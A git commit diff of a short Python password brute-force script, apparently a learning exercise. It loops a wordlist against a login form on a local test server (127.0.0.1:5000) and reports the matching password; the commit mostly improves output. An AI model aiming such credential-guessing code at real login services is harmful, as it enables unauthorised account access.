5c02f29914c25c055af6fb43c74d86bcd78e7efb
GiovanniMatos <giovannyafonso23@gmail.com>
2023-09-08 21:08:33 -0400

    commit

--- bruteforce/bruteforce.py
+++ bruteforce/bruteforce.py
@@ -1,11 +1,14 @@
 import requests
+import time
+import os
 print("xxxxxxx Brute Force teste xxxxxxx")
 usuario = input("Usuário: ")
 wordlist = open(".\wordlist.txt", "r").readlines()
 wordlist = [x.replace("\n", "") for x in wordlist]
 
+host = "http://127.0.0.1:5000/login"
 
-# Crie um dicionário com as informações de login.
+# Payload
 for senha in wordlist:
     login_data = {
         "nome": usuario,
@@ -13,6 +16,11 @@ for senha in wordlist:
     
     response = requests.post("http://127.0.0.1:5000/login", data=login_data).text
     if "Usuário Logado" not in response:
+        os.system("clear || cls")
         print(f"Testando - {senha}")
+        #time.sleep(0.1)
     else:
-        print(f"\033[32m[+] Senha encontrada - \033[0;0m{senha}")
+        os.system("clear || cls")
+        print("="*40,"\n")
+        print(f"\033[32m[+]\033[0;0m {host} \n\033[32m[+]\033[0;0m Senha encontrada - \033[32m{senha}\033[0;0m")
+        print("\n\n\n")
